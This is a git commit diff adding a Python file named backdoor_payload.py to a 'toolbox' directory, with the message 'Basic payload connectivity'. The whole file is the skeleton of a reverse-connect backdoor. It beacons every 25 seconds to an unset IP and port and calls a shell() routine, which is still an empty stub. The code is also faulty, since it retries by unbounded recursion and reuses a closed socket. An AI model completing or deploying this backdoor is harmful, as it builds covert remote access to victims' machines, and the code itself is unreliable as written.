8b5a012c60368b4be48f8629956d3bc3a72ce8f4
daniil <danikshkabara@tut.by>
2024-01-17 12:23:12 +0300

    Basic payload connectivity

---
+++ project/src/toolbox/backdoor_payload.py
@@ -0,0 +1,21 @@
+import socket
+import time
+
+IP = None
+PORT = None
+def connect(s):
+    while(True):
+        time.sleep(25)
+        try:
+            s.connect((str(IP), int(PORT)))
+            shell()
+            s.close()
+        except:
+            connect(s)
+
+def shell():
+    pass
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect(s)
